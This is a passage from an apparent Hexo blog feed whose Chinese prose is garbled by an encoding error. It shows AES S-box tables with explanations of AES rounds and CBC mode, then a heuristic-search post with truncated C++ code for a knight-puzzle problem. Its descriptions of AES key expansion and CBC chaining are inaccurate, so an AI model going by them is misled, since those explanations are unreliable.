><td>0x6a</td><td>0xcb</td><td>0xbe</td><td>0x39</td><td>0x4a</td><td>0x4c</td><td>0x58</td><td>0xcf</td></tr><tr><td>6</td><td>0xd0</td><td>0xef</td><td>0xaa</td><td>0xfb</td><td>0x43</td><td>0x4d</td><td>0x33</td><td>0x85</td><td>0x45</td><td>0xf9</td><td>0x02</td><td>0x7f</td><td>0x50</td><td>0x3c</td><td>0x9f</td><td>0xa8</td></tr><tr><td>7</td><td>0x51</td><td>0xa3</td><td>0x40</td><td>0x8f</td><td>0x92</td><td>0x9d</td><td>0x38</td><td>0xf5</td><td>0xbc</td><td>0xb6</td><td>0xda</td><td>0x21</td><td>0x10</td><td>0xff</td><td>0xf3</td><td>0xd2</td></tr><tr><td>8</td><td>0xcd</td><td>0x0c</td><td>0x13</td><td>0xec</td><td>0x5f</td><td>0x97</td><td>0x44</td><td>0x17</td><td>0xc4</td><td>0xa7</td><td>0x7e</td><td>0x3d</td><td>0x64</td><td>0x5d</td><td>0x19</td><td>0x73</td></tr><tr><td>9</td><td>0x60</td><td>0x81</td><td>0x4f</td><td>0xdc</td><td>0x22</td><td>0x2a</td><td>0x90</td><td>0x88</td><td>0x46</td><td>0xee</td><td>0xb8</td><td>0x14</td><td>0xde</td><td>0x5e</td><td>0x0b</td><td>0xdb</td></tr><tr><td>A</td><td>0xe0</td><td>0x32</td><td>0x3a</td><td>0x0a</td><td>0x49</td><td>0x06</td><td>0x24</td><td>0x5c</td><td>0xc2</td><td>0xd3</td><td>0xac</td><td>0x62</td><td>0x91</td><td>0x95</td><td>0xe4</td><td>0x79</td></tr><tr><td>B</td><td>0xe7</td><td>0xc8</td><td>0x37</td><td>0x6d</td><td>0x8d</td><td>0xd5</td><td>0x4e</td><td>0xa9</td><td>0x6c</td><td>0x56</td><td>0xf4</td><td>0xea</td><td>0x65</td><td>0x7a</td><td>0xae</td><td>0x08</td></tr><tr><td>C</td><td>0xba</td><td>0x78</td><td>0x25</td><td>0x2e</td><td>0x1c</td><td>0xa6</td><td>0xb4</td><td>0xc6</td><td>0xe8</td><td>0xdd</td><td>0x74</td><td>0x1f</td><td>0x4b</td><td>0xbd</td><td>0x8b</td><td>0x8a</td></tr><tr><td>D</td><td>0x70</td><td>0x3e</td><td>0xb5</td><td>0x66</td><td>0x48</td><td>0x03</td><td>0xf6</td><td>0x0e</td><td>0x61</td><td>0x35</td><td>0x57</td><td>0xb9</td><td>0x86</td><td>0xc1</td><td>0x1d</td><td>0x9e</td></tr><tr><td>E</td><td>0xe1</td><td>0xf8</td><td>0x98</td><td>0x11</td><td>0x69</td><td>0xd9</td><td>0x8e</td><td>0x94</td><td>0x9b</td><td>0x1e</td><td>0x87</td><td>0xe9</td><td>0xce</td><td>0x55</td><td>0x28</td><td>0xdf</td></tr><tr><td>F</td><td>0x8c</td><td>0xa1</td><td>0x89</td><td>0x0d</td><td>0xbf</td><td>0xe6</td><td>0x42</td><td>0x68</td><td>0x41</td><td>0x99</td><td>0x2d</td><td>0x0f</td><td>0xb0</td><td>0x54</td><td>0xbb</td><td>0x16</td></tr></tbody></table><p>é‚£ä¹ˆå®ƒçš„é€†è¡¨å°±æ˜¯</p><table><thead><tr><th>è¡Œ/åˆ—</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x52</td><td>0x09</td><td>0x6a</td><td>0xd5</td><td>0x30</td><td>0x36</td><td>0xa5</td><td>0x38</td><td>0xbf</td><td>0x40</td><td>0xa3</td><td>0x9e</td><td>0x81</td><td>0xf3</td><td>0xd7</td><td>0xfb</td></tr><tr><td>1</td><td>0x7c</td><td>0xe3</td><td>0x39</td><td>0x82</td><td>0x9b</td><td>0x2f</td><td>0xff</td><td>0x87</td><td>0x34</td><td>0x8e</td><td>0x43</td><td>0x44</td><td>0xc4</td><td>0xde</td><td>0xe9</td><td>0xcb</td></tr><tr><td>2</td><td>0x54</td><td>0x7b</td><td>0x94</td><td>0x32</td><td>0xa6</td><td>0xc2</td><td>0x23</td><td>0x3d</td><td>0xee</td><td>0x4c</td><td>0x95</td><td>0x0b</td><td>0x42</td><td>0xfa</td><td>0xc3</td><td>0x4e</td></tr><tr><td>3</td><td>0x08</td><td>0x2e</td><td>0xa1</td><td>0x66</td><td>0x28</td><td>0xd9</td><td>0x24</td><td>0xb2</td><td>0x76</td><td>0x5b</td><td>0xa2</td><td>0x49</td><td>0x6d</td><td>0x8b</td><td>0xd1</td><td>0x25</td></tr><tr><td>4</td><td>0x72</td><td>0xf8</td><td>0xf6</td><td>0x64</td><td>0x86</td><td>0x68</td><td>0x98</td><td>0x16</td><td>0xd4</td><td>0xa4</td><td>0x5c</td><td>0xcc</td><td>0x5d</td><td>0x65</td><td>0xb6</td><td>0x92</td></tr><tr><td>5</td><td>0x6c</td><td>0x70</td><td>0x48</td><td>0x50</td><td>0xfd</td><td>0xed</td><td>0xb9</td><td>0xda</td><td>0x5e</td><td>0x15</td><td>0x46</td><td>0x57</td><td>0xa7</td><td>0x8d</td><td>0x9d</td><td>0x84</td></tr><tr><td>6</td><td>0x90</td><td>0xd8</td><td>0xab</td><td>0x00</td><td>0x8c</td><td>0xbc</td><td>0xd3</td><td>0x0a</td><td>0xf7</td><td>0xe4</td><td>0x58</td><td>0x05</td><td>0xb8</td><td>0xb3</td><td>0x45</td><td>0x06</td></tr><tr><td>7</td><td>0xd0</td><td>0x2c</td><td>0x1e</td><td>0x8f</td><td>0xca</td><td>0x3f</td><td>0x0f</td><td>0x02</td><td>0xc1</td><td>0xaf</td><td>0xbd</td><td>0x03</td><td>0x01</td><td>0x13</td><td>0x8a</td><td>0x6b</td></tr><tr><td>8</td><td>0x3a</td><td>0x91</td><td>0x11</td><td>0x41</td><td>0x4f</td><td>0x67</td><td>0xdc</td><td>0xea</td><td>0x97</td><td>0xf2</td><td>0xcf</td><td>0xce</td><td>0xf0</td><td>0xb4</td><td>0xe6</td><td>0x73</td></tr><tr><td>9</td><td>0x96</td><td>0xac</td><td>0x74</td><td>0x22</td><td>0xe7</td><td>0xad</td><td>0x35</td><td>0x85</td><td>0xe2</td><td>0xf9</td><td>0x37</td><td>0xe8</td><td>0x1c</td><td>0x75</td><td>0xdf</td><td>0x6e</td></tr><tr><td>A</td><td>0x47</td><td>0xf1</td><td>0x1a</td><td>0x71</td><td>0x1d</td><td>0x29</td><td>0xc5</td><td>0x89</td><td>0x6f</td><td>0xb7</td><td>0x62</td><td>0x0e</td><td>0xaa</td><td>0x18</td><td>0xbe</td><td>0x1b</td></tr><tr><td>B</td><td>0xfc</td><td>0x56</td><td>0x3e</td><td>0x4b</td><td>0xc6</td><td>0xd2</td><td>0x79</td><td>0x20</td><td>0x9a</td><td>0xdb</td><td>0xc0</td><td>0xfe</td><td>0x78</td><td>0xcd</td><td>0x5a</td><td>0xf4</td></tr><tr><td>C</td><td>0x1f</td><td>0xdd</td><td>0xa8</td><td>0x33</td><td>0x88</td><td>0x07</td><td>0xc7</td><td>0x31</td><td>0xb1</td><td>0x12</td><td>0x10</td><td>0x59</td><td>0x27</td><td>0x80</td><td>0xec</td><td>0x5f</td></tr><tr><td>D</td><td>0x60</td><td>0x51</td><td>0x7f</td><td>0xa9</td><td>0x19</td><td>0xb5</td><td>0x4a</td><td>0x0d</td><td>0x2d</td><td>0xe5</td><td>0x7a</td><td>0x9f</td><td>0x93</td><td>0xc9</td><td>0x9c</td><td>0xef</td></tr><tr><td>E</td><td>0xa0</td><td>0xe0</td><td>0x3b</td><td>0x4d</td><td>0xae</td><td>0x2a</td><td>0xf5</td><td>0xb0</td><td>0xc8</td><td>0xeb</td><td>0xbb</td><td>0x3c</td><td>0x83</td><td>0x53</td><td>0x99</td><td>0x61</td></tr><tr><td>F</td><td>0x17</td><td>0x2b</td><td>0x04</td><td>0x7e</td><td>0xba</td><td>0x77</td><td>0xd6</td><td>0x26</td><td>0xe1</td><td>0x69</td><td>0x14</td><td>0x63</td><td>0x55</td><td>0x21</td><td>0x0c</td><td>0x7d</td></tr></tbody></table><p>æ¯”å¦‚åœ¨ç¬¬ä¸€ä¸ªè¡¨ä¸­å¯ä»¥çœ‹åˆ°0è¡Œ0åˆ—æ˜¯0x63ï¼Œä¸ä¹‹å¯¹åº”çš„ï¼Œåœ¨ç¬¬äºŒå¼ è¡¨çš„ç¬¬6è¡Œç¬¬ä¸‰åˆ—å°±æ˜¯0x00ï¼Œä¹Ÿå°±æ˜¯0x63åœ¨ç¬¬ä¸€ä¸ªè¡¨ä¸­çš„ä½ç½®ã€‚å› ä¸ºAESæ˜¯å¯¹ç§°åŠ å¯†ï¼Œæ‰€ä»¥æ¯ä¸€æ­¥æ“ä½œéƒ½éœ€è¦å¯é€†ã€‚</p><h2 id="è¡Œä½ç§»"><a href="#è¡Œä½ç§»" class="headerlink" title="è¡Œä½ç§»"></a>è¡Œä½ç§»</h2><p>è¿™é‡Œè¦è¯´ä¸€ä¸‹ï¼ŒAESåˆ†ç»„æ˜¯16ä¸ªå­—èŠ‚ä¸€ç»„ï¼Œåœ¨åŠ å¯†çš„è¿‡ç¨‹ä¸­16å­—èŠ‚ä¼šå½¢æˆ4x4çš„çŸ©é˜µï¼Œå­—èŠ‚æŒ‰ç…§ä»¥ä¸‹é¡ºåºæ’åˆ—</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/3.png" alt="3"></p><p>è¡Œç§»ä½æ˜¯ä¸€ä¸ªç®€å•çš„å·¦å¾ªç¯ç§»ä½æ“ä½œã€‚ç¬¬0è¡Œå·¦ç§»0å­—èŠ‚ï¼Œç¬¬1è¡Œå·¦ç§»1å­—èŠ‚ï¼Œç¬¬2è¡Œå·¦ç§»2å­—èŠ‚ï¼Œç¬¬3è¡Œå·¦ç§»3å­—èŠ‚ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/2021/12/18/AES%E5%8A%A0%E5%AF%86/4.png" alt="4"></p><p>é€†å˜æ¢å½“ç„¶ä¹Ÿå¾ˆç®€å•ï¼Œå°±ä¸ç»†è®²äº†ã€‚</p><h2 id="åˆ—æ··æ·†"><a href="#åˆ—æ··æ·†" class="headerlink" title="åˆ—æ··æ·†"></a>åˆ—æ··æ·†</h2><p>è¿™ä¸ªæ¶‰åŠåˆ°çš„çŸ¥è¯†æ¯”è¾ƒå¤šï¼Œæˆ‘æœ‰ç‚¹éš¾ä»¥æ¥å—ï¼Œmarkä¸€ä¸‹ï¼Œä»¥åå†è¡¥</p><p>å°±æ˜¯è¯´æŠŠå®ƒå½“æˆä¸€ä¸ªçŸ©é˜µç„¶åå’Œå¦ä¸€ä¸ªçŸ©é˜µåšä¹˜æ³•è¿ç®—å¾—åˆ°æ–°çš„çŸ©é˜µï¼Œè‡³äºé€†è¿‡ç¨‹å°±æ˜¯å¯¹é€†çŸ©é˜µåšä¹˜æ³•ã€‚ç„¶åè¿™é‡Œé¢çš„åŠ æ³•å°±æ˜¯å¼‚æˆ–ï¼Œä¹˜æ³•ä¼šå˜æˆå–æ¨¡ä¹˜æ³•ã€‚(åº”è¯¥æ˜¯è¿™æ ·çš„)</p><h2 id="è½®å¯†é’¥åŠ "><a href="#è½®å¯†é’¥åŠ " class="headerlink" title="è½®å¯†é’¥åŠ "></a>è½®å¯†é’¥åŠ </h2><p>è¿™ä¸ªå¾ˆç®€å•ï¼Œå°±æ˜¯æ‰©å±•å¯†é’¥ï¼Œå¯†é’¥è¾“å…¥äº†16å­—èŠ‚ï¼Œæ¯ç»„å››ä¸ªå­—èŠ‚å°±æ˜¯å››ç»„ï¼Œç¬¬ä¸€ç»„å’Œç¬¬å››ç»„å¼‚æˆ–å¾—åˆ°ç¬¬äº”ç»„ï¼Œç¬¬äºŒç»„å’Œç¬¬äº”ç»„å¼‚æˆ–å¾—åˆ°ç¬¬å…­ç»„ï¼Œç¬¬ä¸‰ç»„å’Œç¬¬å…­ç»„å¼‚æˆ–å¾—åˆ°ç¬¬ä¸ƒç»„ï¼Œä»¥æ­¤ç±»æ¨ã€‚å› ä¸ºè¦åŠ å¯†10æ¬¡ï¼Œæ‰€ä»¥æ‰©å±•å‡ºå››åç»„å¯†é’¥ã€‚</p><p>ç„¶åå°±æ˜¯å¾ˆç®€å•çš„äº†ï¼Œåˆ—æ··æ·†å¾—åˆ°çš„çŸ©é˜µå†å’Œå¯†é’¥å¼‚æˆ–ä¸€ä¸‹å³å¯ã€‚æ¯æ¬¡éƒ½å’Œä¸ä¸€æ ·çš„å¯†é’¥åšå¼‚æˆ–ï¼Œä¸€å…±åæ¬¡ï¼Œè¿™å°±æ˜¯AESã€‚</p><h1 id="CBCæ¨¡å¼"><a href="#CBCæ¨¡å¼" class="headerlink" title="CBCæ¨¡å¼"></a>CBCæ¨¡å¼</h1><p>åˆ†ç»„åŠ å¯†æœ‰ä¸€ä¸ªç¼ºç‚¹ï¼Œåˆ†ç»„ä¹‹é—´ç‹¬ç«‹ï¼Œä¸€æ ·çš„æ•°æ®ä¸ç®¡åœ¨ç¬¬å‡ ç»„éƒ½æ˜¯ä¸€æ ·çš„åŠ å¯†ï¼Œå¦‚æœæˆ‘å·²åªå¾ˆå¤šå¯†æ–‡æ˜æ–‡å¯¹ï¼Œé‚£ä¹ˆåŠ å¯†çš„ä¿¡æ¯å¾ˆå¯èƒ½ä¼šè¢«æš´åŠ›ç ´è§£å‡ºæ¥ï¼ŒCBCå°±æ˜¯ç”¨æ¥å¯¹æŠ—è¿™ä¸ªç¼ºç‚¹çš„ã€‚CBCä¸é€šçš„å°±æ˜¯ï¼Œä¼šæœ‰ä¸€ä¸ªåˆå§‹å‘é‡ä¸ç¬¬ä¸€ç»„çš„æ•°æ®è¿›è¡Œå¼‚æˆ–ï¼Œç„¶åç¬¬äºŒç»„çš„ä¼šå’Œç¬¬ä¸€ç»„å¼‚æˆ–åŠ å¯†å‰çš„æ•°æ®å¼‚æˆ–å†è¿›è¡ŒåŠ å¯†ï¼Œä»¥æ­¤ç±»æ¨ï¼Œè¿™æ ·çš„è¯ï¼Œåˆ†ç»„ä¹‹é—´å°†ä¸å†ç‹¬ç«‹ï¼Œæ”¹åŠ¨å‰é¢çš„ä¸€ä¸ªå­—èŠ‚å¾ˆå¯èƒ½å¯¼è‡´æ•´ä¸ªå¯†æ–‡å‘ç”Ÿå·¨å¤§å˜åŒ–ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å¯å‘å¼æœç´¢ç®—æ³•è¿›é˜¶</title>
      <link href="/2021/12/16/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E8%BF%9B%E9%98%B6/"/>
      <url>/2021/12/16/%E5%90%AF%E5%8F%91%E5%BC%8F%E6%90%9C%E7%B4%A2%E7%AE%97%E6%B3%95%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<p>ç»§ç»­æ¥å­¦å¯å‘å¼æœç´¢</p><span id="more"></span><p>å¤šçš„å…¶å®æ²¡å•¥å¥½è®²äº†çš„ï¼Œå› ä¸ºæ¦‚å¿µé—®é¢˜åœ¨å‰ä¸€ç¯‡åšæ–‡å·²ç»è®²çš„å¾ˆæ¸…æ¥šäº†ã€‚ä¸»è¦å°±æ˜¯è®­ç»ƒå¯»æ‰¾ä¼°å€¼å‡½æ•°ï¼Œå¤šç‚¹é¢˜ç›®ç»ƒä¹ èƒ½åº”å¯¹ä¸é€šåœºæ™¯ä¸‹çš„å¯å‘å¼æœç´¢ã€‚</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>æ´›è°·ä¸Šçš„<a href="https://www.luogu.com.cn/problem/P2324">p2324éª‘å£«ç²¾ç¥</a></p><h3 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h3><p><img src="https://cdn.luogu.com.cn/upload/pic/1389.png" alt="1"></p><p>ä¸»è¦å°±æ˜¯è¯´æœ‰ä¸ªç©ºæ ¼ï¼Œç„¶åæ‰€æœ‰é©¬éƒ½èµ°æ—¥ï¼Œæ²¡æœ‰é©¬è„šï¼Œåªèƒ½è·³åˆ°ç©ºæ ¼é‡Œé¢å»ï¼Œç„¶åé—®ä½ æ˜¯å¦èƒ½åœ¨15æ­¥ä»¥å†…è¾¾åˆ°ã€‚å¦‚æœå¯ä»¥åˆ™è¾“å‡ºæœ€çŸ­æ­¥æ•°ï¼Œå¦åˆ™è¾“å‡º-1ï¼Œå› ä¸ºç©ºæ ¼åªæœ‰ä¸€ä¸ªæˆ‘ä»¬ä¸è€ƒè™‘è·³é©¬ï¼Œè€ƒè™‘è·³ç©ºæ ¼ã€‚</p><p>é€’å½’æœ€å¤§æ·±åº¦15å±‚èƒ½ç¡®å®šäº†ï¼Œä½†æ˜¯ä»»æ„ä¸€ä¸ªçŠ¶æ€å¯ä»¥å»¶ä¼¸å‡ºæœ€å°‘2ä¸­æœ€å¤šå…«ç§æƒ…å†µã€‚15ä½œä¸ºæŒ‡æ•°æ—¶é—´ä¸Šè¿˜æ˜¯é­ä¸ä½ï¼Œè€ƒè™‘å¯å‘å¼æœç´¢ã€‚é‚£ä¹ˆä¼°å€¼å‡½æ•°éœ€è¦æ€ä¹ˆå†™å‘¢ï¼Ÿ</p><h3 id="ä¼°å€¼å‡½æ•°"><a href="#ä¼°å€¼å‡½æ•°" class="headerlink" title="ä¼°å€¼å‡½æ•°"></a>ä¼°å€¼å‡½æ•°</h3><p>è¿™é‡Œå†è¡¥å……ç‚¹ä¼°å€¼å‡½æ•°çš„çŸ¥è¯†ã€‚</p><p><em>f</em>(<em>n</em>)=<em>g</em>(<em>n</em>)+<em>h</em>(<em>n</em>)</p><p>ä¼°å€¼å‡½æ•°ä¸€èˆ¬è¡¨è¾¾å¼å¦‚ä¸Šï¼Œg(n)ä¸ºå½“å‰çŠ¶æ€ï¼Œh(n)ä¸ºæœªæ¥æœ€ä¼˜çŠ¶æ€äº§ç”Ÿçš„èŠ±è´¹ï¼Œæˆ–è€…æ˜¯å…¶å®ƒã€‚ä¼°å€¼å‡½æ•°ä¸ºä¸¤è€…å’Œï¼Œç”±äºå½“å‰çŠ¶æ€æˆ‘ä»¬å¾ˆå®¹æ˜“è·å–ï¼Œæ‰€ä»¥ç®—å‡ºæœªæ¥æœ€ä¼˜çŠ¶æ€å³å¯ç­‰äºè·å¾—äº†ä¼°å€¼å‡½æ•°ã€‚å¯èƒ½å‰é¢è®²çš„æœ‰ç‚¹å°é—®é¢˜ï¼Œä½†æ˜¯è¿˜æ˜¯ä¸å¦¨ç¢çš„ï¼Œå› ä¸ºæˆ‘ä»¬å¹³æ—¶å†™ä¹ŸåŸºæœ¬æ˜¯</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">f</span>(n)+value&gt;ans)&#123;</span><br><span class="line">    <span class="built_in">dfs</span>(n+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥é—®é¢˜ä¸å¤§ã€‚</p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>åœ¨æœ¬é¢˜ä¸­ï¼Œæˆ‘ä»¬çš„ä¼°å€¼å‡½æ•°åº”è¯¥æ˜¯ç®—èƒ½åˆ°è¾¾ç›®çš„çŠ¶æ€çš„æœ€å°æ­¥æ•°ã€‚é‚£ä¹ˆè¿™ä¸ªæ€ä¹ˆå»è€ƒè™‘å‘¢ï¼Œå…¶å®å¯ä»¥æ‹¿å½“å‰çŠ¶æ€ä¸ç›®æ ‡çŠ¶æ€ç›¸æ¯”è¾ƒï¼Œå¦‚æœæœ‰ä¸¤ä¸ªç‚¹ä¸ç¬¦åˆç›®æ ‡çŠ¶æ€ï¼Œé‚£ä¹ˆå®ƒä»¬æœ€ä¼˜èƒ½è¾¾æˆç›®æ ‡çŠ¶æ€ä¸€å®šæ˜¯1ï¼Œè¿™é‡Œçš„æœ€ä¼˜æŒ‡çš„æ˜¯æ‰€æœ‰çš„è¿™ä¸ªæƒ…å†µä¸‹èƒ½è¾¾æˆç›®çš„çŠ¶æ€çš„æœ€å°å€¼ã€‚å› ä¸ºå¦‚æœä¸¤ä¸ªä¸ç¬¦åˆçš„ç‚¹ä¸å½¢æˆâ€œæ—¥â€å­—çš„å…³ç³»ï¼Œé‚£ä¹ˆå®ƒä»¬å¯èƒ½å°±ä¸æ­¢éœ€è¦1æ­¥äº†ï¼Œä½†æ˜¯ä¼°å€¼å¹¶ä¸æ˜¯çœŸçš„å»è®¡ç®—çœŸæ­£çš„å®é™…æƒ…å†µï¼Œä¼°å€¼å‡½æ•°éœ€è¦å°½å¯èƒ½çš„æ–¹ä¾¿è®¡ç®—ï¼Œè¿™ç‚¹å¾ˆé‡è¦ã€‚</p><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬æœ‰ä¸‰ä¸ªç‚¹ä¸ä¸€æ ·é‚£æƒ…å†µå¦‚ä½•å‘¢ï¼Ÿé‚£è€ƒè™‘æœ€å¥½çš„æƒ…å†µé‚£è¿˜å¾—æ˜¯2æ­¥è§£å†³ã€‚æ‰€ä»¥æˆ‘ä»¬å¾ˆå®¹æ˜“å¯ä»¥å‘ç°ï¼Œå‡å¦‚å½“å‰çŠ¶æ€ä¸ç›®æ ‡çŠ¶æ€æœ‰nä¸ªç‚¹ä¸ä¸€æ ·ï¼Œé‚£ä¹ˆå®ƒæœ€å°‘éœ€è¦n-1æ­¥æ¥å®Œæˆã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¾ˆå®¹æ˜“å¯ä»¥å†™å‡ºä¼°å€¼å‡½æ•°</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tot=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)&#123;</span><br><span class="line">        tot+=!!(qipan[i/<span class="number">5</span>][i%<span class="number">5</span>]^goal[i/<span class="number">5</span>][i%<span class="number">5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“ä¼°å€¼å‡½æ•°è¿”å›-1çš„æ—¶å€™è¯´æ˜å½“å‰å·²ç»ç¬¦åˆç›®æ ‡çŠ¶æ€äº†ï¼Œé‚£ä¹ˆè¿™ä¸ªå°†ä½œä¸ºæœç´¢ç»ˆæ­¢æ¡ä»¶ï¼Œå¹¶æ›´æ–°æœ€ä¼˜è§£ã€‚</p><p>å‰©ä¸‹çš„å°±æ˜¯ç»ˆå½’ä¸­è·çš„dfsäº†ã€‚</p><p>æ ‡ç¨‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> goal[<span class="number">5</span>][<span class="number">5</span>]=&#123;</span><br><span class="line">    <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> qipan[<span class="number">5</span>][<span class="number">5</span>];</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">-2</span>,<span class="number">-2</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>&#125;,dy[]=&#123;<span class="number">-1</span>,<span class="number">1</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">-1</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0x7fffffff</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tot=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">25</span>;i++)&#123;</span><br><span class="line">        tot+=!!(qipan[i/<span class="number">5</span>][i%<span class="number">5</span>]^goal[i/<span class="number">5</span>][i%<span class="number">5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> step)</span></span>&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;1&quot;);</span></span><br><span class="line">    <span class="keyword">if</span>(step&gt;<span class="number">15</span>)<span class="keyword">return</span> ;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">f</span>())&#123;</span><br><span class="line">        ans=<span class="built_in">min</span>(ans,step);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">int</span> new_x=x+dx[i],new_y=y+dy[i];</span><br><span class="line">        <span class="keyword">if</span>(new_x&lt;<span class="number">0</span>||new_x&gt;=<span class="number">5</span>||new_y&lt;<span class="number">0</span>||new_y&gt;=<span class="number">5</span>)<span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">swap</span>(qipan[new_y][new_x],qipan[y][x]);</span><br><span class="line">        <span class="keyword">if</span>(step+<span class="built_in">f</span>()&lt;=<span class="built_in">min</span>(ans,<span class="number">15</span>))&#123;</span><br><span class="line">            <span class="built_in">search</span>(new_x,new_y,step+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">swap</span>(qipan[new_y][new_x],qipan[y][x]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    string s;</span><br><span class="line">    <span class="keyword">int</span> start_x,start_y;</span><br><span class="line">    